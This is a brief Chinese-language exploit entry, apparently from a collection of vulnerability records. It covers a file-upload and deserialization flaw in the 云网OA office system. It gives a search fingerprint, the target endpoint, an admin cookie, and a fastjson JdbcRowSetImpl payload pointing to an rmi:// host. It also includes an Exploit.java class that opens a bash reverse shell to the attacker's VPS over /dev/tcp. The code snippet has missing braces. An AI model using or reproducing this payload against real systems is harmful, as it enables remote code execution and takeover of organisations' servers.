# 云网OAupdateUiSetup存在文件上传漏洞

- **系统**：云网　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="云网OA"`
- **请求**：`POST /oa//setup/updateUiSetup HTTP/1.1`
- **关键头**：`Cookie: skincode=lte; name=admin; pwd=; JSESSIONID=85F37A117572BE90EA4BA0ED10F77EF5`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
uiSetup={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://${Dnslog}$/Exploit", "autoCommit":true}}
文件定位：
Exploit.java
public class Exploit {
public Exploit(){
try {
java.lang.Runtime.getRuntime().exec(
new String[]{"bash", "-c", "bash -i >& /dev/tcp/VPS地址/12345 0>&1"});
catch(Exception e){
e.printStackTrace();
public static void main(String[] argv){
Exploit e = new Exploit();
}
```
- **预期**：200　|　—